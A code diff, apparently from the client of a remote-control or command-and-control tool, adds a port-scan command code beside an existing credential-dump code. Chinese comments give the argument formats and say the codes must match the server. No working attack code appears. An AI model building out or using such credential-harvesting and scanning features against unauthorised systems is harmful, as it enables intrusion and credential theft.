@@ -137,4 +137,8 @@ const (
 	// 凭据获取（阶段三，须与服务端 pkg/command/cmdType.go 一致）：
 	// cmdBuf = "kind|tech|fileName"。制品经下载通道回传（type22 头 + type26 分块）。
 	CRED_DUMP = 130
+
+	// 端口扫描（阶段三，须与服务端 pkg/command/cmdType.go 一致）：
+	// cmdBuf = "<targets> <ports> [timeoutMs]"（如 "10.0.0.0/24 top 500"）
+	PORT_SCAN = 131
 )
